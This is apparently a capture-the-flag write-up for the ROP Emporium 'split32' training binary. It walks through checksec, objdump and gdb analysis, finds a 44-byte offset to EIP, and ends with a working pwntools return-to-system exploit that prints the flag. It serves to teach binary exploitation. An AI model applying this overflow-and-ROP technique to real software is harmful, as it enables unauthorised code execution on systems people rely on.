First of all, use checksec to get some binary information
```shell
[marco@marco-pc Downloads]$ file split32
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f8a6d6bf3d264d331ecbf9d1e6858d6eac124b89, not stripped
[marco@marco-pc Downloads]$ checksec --file=split32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols     No	0		3	split32
```

The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
```shell
[marco@marco-pc Downloads]$ objdump -t split32
...
080485f6 l     F .text	00000053              pwnme
...
08048649 l     F .text	00000019              usefulFunction
...
0804a030 g     O .data	0000001a              usefulString
```

There are some interesting stuff:
- pwnme, which is called from main, print some strings and get an input;
- usefulFunction perfom a system comand "/bin/ls"
- usefulString is "/bin/cat flag.txt"
```gdb
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:	push   ebp
   0x0804864a <+1>:	mov    ebp,esp
   0x0804864c <+3>:	sub    esp,0x8
   0x0804864f <+6>:	sub    esp,0xc
   0x08048652 <+9>:	push   0x8048747
   0x08048657 <+14>:	call   0x8048430 <system@plt>
   0x0804865c <+19>:	add    esp,0x10
   0x0804865f <+22>:	nop
   0x08048660 <+23>:	leave  
   0x08048661 <+24>:	ret    
End of assembler dump.
pwndbg> x/s 0x8048747
0x8048747:	"/bin/ls"
pwndbg> x/s 0x0804a030
0x804a030 <usefulString>:	"/bin/cat flag.txt"
```

With a buffer overflow we can control the EIP. Jumping at system@plt with usefulString as parameter, we can read the flag.
Let's find out how many bytes we need to fill until EIP
```gdb
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

...

split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.

...

 EIP  0x6161616c ('laaa')

...

pwndbg> cyclic -l 'laaa'
44
```

Final exploit:
NOTE: Instead of "BBBB" we could use exit() address for a clean termination
```python
from pwn import *

system_addr = 0x8048430
string_addr = 0x804a030
 
expl = ("A"*44).encode()
expl += p32(system_addr)
expl += ("BBBB").encode()
expl += p32(string_addr)
 
p = process('./split32')
p.recvuntil('>')
p.sendline(expl)
print(p.recvall().decode())
```
